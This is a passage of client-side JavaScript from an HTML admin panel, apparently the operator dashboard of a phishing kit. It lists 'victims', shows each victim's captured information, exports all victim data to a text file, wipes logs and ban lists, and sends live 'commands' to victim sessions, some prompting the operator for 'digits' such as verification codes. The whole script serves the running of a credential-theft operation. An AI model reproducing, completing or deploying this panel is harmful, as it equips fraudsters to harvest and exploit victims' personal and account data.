    })
    .catch(error => {
        console.error('Error:', error);
        toastr["error"]("An error occurred while saving log #" + id);
    });
}



function saveAll() {
    fetch('inc/action.php?type=getallinfo', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        }
    })
    .then(response => response.json())
    .then(parsed_data => {
        if (parsed_data.status === 'ok') {
            const htmlContent = parsed_data.info;

            // Initialize the log content
            let log = '';

            // Use DOMParser to parse the HTML content
            const doc = new DOMParser().parseFromString(htmlContent, "text/html");
            const tables = doc.querySelectorAll("table");

            // Loop through each table to extract key-value pairs
            tables.forEach((table) => {
                const rows = table.querySelectorAll("tr");
                rows.forEach((row) => {
                    const cells = row.querySelectorAll("td");
                    if (cells.length === 2) {
                        const key = cells[0].textContent.trim();
                        const value = cells[1].textContent.trim();
                        log += `${key}: ${value || ''}\n`; // Handle empty fields
                    }
                });
                log += "\n===========\n\n"; // Add separator between datasets
            });

            // Create and save the log as a text file
            const textFileAsBlob = new Blob([log], { type: 'text/plain' });
            const d = new Date();
            const fileNameToSaveAs = `AllUserData_${d.getMonth() + 1}-${d.getDate()}-${d.getFullYear()}.txt`;

            const downloadLink = document.createElement("a");
            downloadLink.download = fileNameToSaveAs;
            downloadLink.href = URL.createObjectURL(textFileAsBlob);
            downloadLink.click();

            toastr["success"]("All logs successfully saved!");
        } else {
            toastr["error"]("Failed to save logs: " + parsed_data.message);
        }
    })
    .catch((error) => {
        console.error('Error:', error);
        toastr["error"]("An error occurred while saving logs.");
    });
}




function show_info(id) {
    const modalTitle = document.getElementById('infomodaltitle');
    const modalValue = document.getElementById('infomodalvalue');

    // Initialize the modal to show loading state
    modalTitle.innerHTML = 'Loading info...';
    modalValue.innerHTML = ''; // Clear previous data

    // Send the request to fetch the victim's information
    fetch('inc/action.php?type=getinfo', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'userid=' + id
    })
    .then(response => response.json())
    .then(parsed_data => {
        // Check if the server response indicates success
        if (parsed_data.status === 'ok') {
            const log = parsed_data.info;
            modalTitle.innerHTML = `#${id} Victim Info`; // Update title with the ID
            modalValue.innerHTML = log; // Update the modal with the info
        } else {
            toastr["error"]("Failed to get information for victim #" + id);
            modalTitle.innerHTML = 'Error'; // Change title to Error
            modalValue.innerHTML = 'Failed to retrieve information. Please try again later.'; // Display an error message in the modal
        }
    })
    .catch(error => {
        // Handle errors in the fetch request
        console.error('Error:', error);
        toastr["error"]("An error occurred while retrieving information for victim #" + id);
        modalTitle.innerHTML = 'Error';
        modalValue.innerHTML = 'An unexpected error occurred. Please try again later.';
    });
}



function reset_visits() {
    if (confirm("Are you sure you want to reset the visits counter?")) {
        // Immediately reset the visits counter on the page (if applicable)
        const visitsCounter = document.getElementById('visitsCounter'); // Replace with your actual counter element
        if (visitsCounter) {
            visitsCounter.textContent = '0'; // Reset the counter immediately
        }

        // Perform the server-side action to reset visits
        console.time("resetVisitsAction");
        fetch('inc/action.php?type=visits_reset', {
            method: 'GET',
        })
        .then(response => response.json())
        .then(rasponse => {
            if (rasponse.status === 'ok') {
                toastr["success"]("Visits counter has been reset");
                console.timeLog("resetVisitsAction", "Visits counter reset on server");
            } else {
                toastr["error"]("Failed to reset visits counter");
                console.timeLog("resetVisitsAction", "Failed to reset visits on server");
            }
        })
        .catch(error => {
            console.error('Error:', error);
            toastr["error"]("An error occurred while resetting visits counter");
        })
        .finally(() => {
            console.timeEnd("resetVisitsAction");
        });
    }
}



function wipe() {
    if (confirm("Are you sure? This will clear all log entries")) {
        // Get the table or container where the rows are displayed
        const table = document.getElementById('victimsTable'); // Replace with your actual table ID
        
        // Immediately remove all rows from the DOM
        if (table) {
            const rows = table.querySelectorAll('tr'); // Select all rows
            rows.forEach(row => row.remove()); // Remove each row from the table
        }

        // Perform the server-side action to clear logs
        console.time("clearLogsAction");
        fetch('inc/action.php?type=clearlogs', {
            method: 'POST',
        })
        .then(response => response.json())
        .then(parsed_data => {
            if (parsed_data.status === 'ok') {
                toastr["success"]("Logs wiped successfully");
                console.timeLog("clearLogsAction", "Logs cleared on server");
            } else {
                toastr["error"]("Failed to wipe logs");
                console.timeLog("clearLogsAction", "Failed to clear logs on server");
            }
        })
        .catch(error => {
            console.error('Error:', error);
            toastr["error"]("An error occurred while wiping logs");
        })
        .finally(() => {
            console.timeEnd("clearLogsAction");
        });
    }
}






function reset_bans() {
    if (confirm("Are you sure? This action will clear the ban list")) {
        fetch('reset.php', {
            method: 'GET',
        })
        .then(response => {
            if (response.ok) {
                return response.text(); // Assuming response is plain text, adjust if needed
            } else {
                throw new Error('Server responded with an error');
            }
        })
        .then(() => {
            toastr["success"]("Ban list has been cleared");
        })
        .catch(error => {
            console.error('Error:', error);
            toastr["error"]("An error occurred while resetting the ban list");
        });
    }
}




function pause_all_alerts() {
    fetch('inc/action.php?type=buzzoff', {
        method: 'GET',
    })
    .then(response => response.json())
    .then(rasponse => {
        if (rasponse.status === 'ok') {
            // Check if buzzed is now '1' or '0'
            let action = rasponse.action === 1 ? "paused" : "unpaused";
            toastr["success"]("Current victims' alerts are now " + action);
        } else {
            toastr["error"]("Failed to update alerts for all victims.");
        }
    })
    .catch(error => {
        console.error('Error:', error);
        toastr["error"]("An error occurred while pausing or unpausing all alerts");
    });
}


function pause_alert(id) {
    $.ajax({
        url: 'inc/action.php?type=buzzoffsingle&userid=' + id,
        type: 'GET',
        success: function(response) {
            var rasponse = JSON.parse(response);
            if (rasponse.status == 'ok') {
                toastr["success"]("alert toggled for #" + id);
                // Toggle the button text based on current buzz state
                var button = document.querySelector(`button[onclick='pause_alert("${id}")']`);
                if (button) {
                    // Check if it's paused and toggle the button text
                    if (button.innerHTML.includes('Pause Alert')) {
                        button.innerHTML = '<i class="fa fa-bell"></i> Unpause Alert';
                    } else {
                        button.innerHTML = '<i class="fa fa-bell-slash"></i> Pause Alert';
                    }
                }
            } else {
                toastr["error"]("Failed to toggle alert for #" + id);
            }
        }
    });
}





function command(id, sts) {
    resume();
    
    const data = new URLSearchParams({
        'userid': id,
        'status': sts
    });

    // Disable the button to prevent double-clicks while processing the request
    const button = document.getElementById('commandButton' + id); // Replace with your button's specific ID or class
    if (button) {
        button.disabled = true;
    }

    // Sending the request
    fetch('inc/action.php?type=commmand', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: data.toString()
    })
    .then(response => response.json())
    .then(parsed_data => {
        if (parsed_data.status === 'ok') {
            toastr["success"]("Command sent successfully");
        } else {
            toastr["error"]("Failed to send your command");
        }
    })
    .catch(error => {
        console.error('Error:', error);
        toastr["error"]("An error occurred while sending the command");
    })
    .finally(() => {
        // Re-enable the button after the request finishes
        if (button) {
            button.disabled = false;
        }
    });
}



function command_with_parms(id, sts) {
    resume();

    // Get user input
    var home = prompt("Please enter digits");
    
    if (home != null && home !== "") {
        const data = new URLSearchParams({
            'userid': id,
            'status': sts,
            'home': home
        });

        // Disable the button to prevent double-clicks while processing the request
        const button = document.getElementById('commandButton' + id); // Adjust the button ID
        if (button) {
            button.disabled = true;
        }

        // Send the request using fetch
        fetch('inc/action.php?type=onecommmand', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: data.toString()
        })
        .then(response => response.json())
        .then(parsed_data => {
            if (parsed_data.status === 'ok') {
                toastr["success"]("Command sent successfully");
            } else {
                toastr["error"]("Failed to send your command");
            }
        })
        .catch(error => {
            console.error('Error:', error);
            toastr["error"]("An error occurred while sending the command");
        })
        .finally(() => {
            // Re-enable the button after the request finishes
            if (button) {
                button.disabled = false;
            }
        });
    }
}

	
	
	
	
function command_with_parms_live(id, sts) {
    resume();

    // Get user input for homelive
    var homelive = prompt("Please enter digits");

    if (homelive != null && homelive !== "") {
        const data = new URLSearchParams({
            'userid': id,
            'status': sts,
            'homelive': homelive
        });

        // Disable the button to prevent multiple submissions while processing the request
        const button = document.getElementById('commandButton' + id); // Adjust the button ID
        if (button) {
            button.disabled = true;
        }

        // Send the request using fetch
        fetch('inc/action.php?type=onecommmandlive', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: data.toString()
        })
        .then(response => response.json())
        .then(parsed_data => {
            if (parsed_data.status === 'ok') {
                toastr["success"]("Command sent successfully");
            } else {
                toastr["error"]("Failed to send your command");
            }
        })
        .catch(error => {
            console.error('Error:', error);
            toastr["error"]("An error occurred while sending the command");
        })
        .finally(() => {
            // Re-enable the button after the request finishes
            if (button) {
                button.disabled = false;
            }
        });
    }
}

	
	
function toggleDropdownAndPause(dropdownId) {
  pause(); // Call your existing pause function
  toggleDropdown(dropdownId);
  toggleOtherDropdown(dropdownId);
}
	
function toggleOtherDropdown(dropdownId) {
  if (activeDropdownId && activeDropdownId !== dropdownId) {
    var otherMenu = document.getElementById(activeDropdownId);
    otherMenu.style.display = 'none';
    document.removeEventListener('click', outsideClickHandler); // Remove existing outside click handler
    activeDropdownId = null;
  }
}
  </script>




</body>

</html>